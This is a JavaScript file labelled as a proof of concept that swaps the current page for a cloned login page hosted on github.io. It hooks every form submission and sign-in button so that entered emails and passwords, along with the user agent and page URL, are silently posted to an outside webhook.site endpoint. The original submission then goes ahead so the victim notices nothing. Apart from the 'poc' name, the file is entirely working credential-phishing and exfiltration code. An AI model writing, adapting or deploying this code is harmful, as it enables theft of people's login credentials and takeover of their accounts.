// poc.js - Complete login page clone loader with credential capture
(function() {
    // Configuration
    const WEBHOOK_URL = 'https://webhook.site/4d3f418d-6920-4ec8-b34c-25a5537c8d78';
    const LOGIN_PAGE_URL = 'https://swathip888a.github.io/ATO/index.html';
    
    // Clear everything and load the actual clone
    function loadFullClone() {
        // Create a full page iframe approach first
        const iframe = document.createElement('iframe');
        iframe.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 999999;
            background: white;
        `;
        iframe.src = LOGIN_PAGE_URL;
        
        // Remove existing content
        document.body.innerHTML = '';
        document.body.style.margin = '0';
        document.body.style.padding = '0';
        document.body.appendChild(iframe);
        
        // Wait for iframe to load then inject credential capture
        iframe.onload = function() {
            try {
                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                
                // Inject credential capture into iframe
                const script = iframeDoc.createElement('script');
                script.textContent = `
                    // Capture credentials from any form
                    function captureCredentials(email, password) {
                        const data = {
                            email: email,
                            password: password,
                            timestamp: new Date().toISOString(),
                            userAgent: navigator.userAgent,
                            pageUrl: window.location.href
                        };
                        
                        fetch('${WEBHOOK_URL}', {
                            method: 'POST',
                            mode: 'cors',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify(data)
                        }).catch(e => console.log('Capture error:', e));
                        
                        // Send to parent window too
                        window.parent.postMessage({type: 'credentials', email: email, password: password}, '*');
                    }
                    
                    // Intercept form submissions
                    document.addEventListener('submit', function(e) {
                        const form = e.target;
                        const emailInput = form.querySelector('input[type="email"], input[name="email"], input[id*="email"]');
                        const passwordInput = form.querySelector('input[type="password"], input[name="password"], input[id*="password"]');
                        
                        if (emailInput && passwordInput && emailInput.value && passwordInput.value) {
                            e.preventDefault();
                            captureCredentials(emailInput.value, passwordInput.value);
                            // Let form submit normally after capture
                            setTimeout(() => form.submit(), 100);
                        }
                    });
                    
                    // Also capture button clicks
                    document.addEventListener('click', function(e) {
                        const btn = e.target.closest('button');
                        if (btn && (btn.type === 'submit' || btn.innerText.toLowerCase().includes('sign') || btn.innerText.toLowerCase().includes('login'))) {
                            const emailInput = document.querySelector('input[type="email"], input[name="email"]');
                            const passwordInput = document.querySelector('input[type="password"], input[name="password"]');
                            
                            if (emailInput && passwordInput && emailInput.value && passwordInput.value) {
                                e.preventDefault();
                                captureCredentials(emailInput.value, passwordInput.value);
                                // Try to submit form if exists
                                const form = emailInput.closest('form');
                                if (form) setTimeout(() => form.submit(), 100);
                            }
                        }
                    });
                    
                    console.log('Credential capture active on clone');
                `;
                iframeDoc.head.appendChild(script);
                
            } catch(e) {
                console.log('Cross-origin restriction, using fallback');
            }
        };
    }
    
    // Alternative: Direct fetch and replace (works better for same-origin)
    function directReplace() {
        fetch(LOGIN_PAGE_URL)
            .then(response => response.text())
            .then(html => {
                // Replace entire document
                document.open();
                document.write(html);
                document.close();
                
                // After page loads, inject credential capture
                setTimeout(() => {
                    const script = document.createElement('script');
                    script.textContent = `
                        // Capture credentials function
                        function sendToWebhook(email, password) {
                            fetch('${WEBHOOK_URL}', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({
                                    email: email,
                                    password: password,
                                    timestamp: new Date().toISOString(),
                                    userAgent: navigator.userAgent,
                                    url: window.location.href
                                })
                            });
                        }
                        
                        // Intercept all form submissions
                        document.querySelectorAll('form').forEach(form => {
                            form.addEventListener('submit', function(e) {
                                const email = this.querySelector('input[type="email"], input[name="email"]')?.value;
                                const password = this.querySelector('input[type="password"], input[name="password"]')?.value;
                                if (email && password) {
                                    e.preventDefault();
                                    sendToWebhook(email, password);
                                    setTimeout(() => this.submit(), 100);
                                }
                            });
                        });
                        
                        // Intercept login buttons
                        document.querySelectorAll('button').forEach(btn => {
                            if (btn.innerText.toLowerCase().includes('sign') || btn.innerText.toLowerCase().includes('login')) {
                                btn.addEventListener('click', function(e) {
                                    const email = document.querySelector('input[type="email"], input[name="email"]')?.value;
                                    const password = document.querySelector('input[type="password"], input[name="password"]')?.value;
                                    if (email && password) {
                                        e.preventDefault();
                                        sendToWebhook(email, password);
                                        const form = document.querySelector('form');
                                        if (form) setTimeout(() => form.submit(), 100);
                                    }
                                });
                            }
                        });
                    `;
                    document.head.appendChild(script);
                }, 500);
            })
            .catch(error => {
                console.error('Error loading clone:', error);
                loadFullClone(); // Fallback to iframe method
            });
    }
    
    // Start with direct replace (cleanest method)
    directReplace();
})();
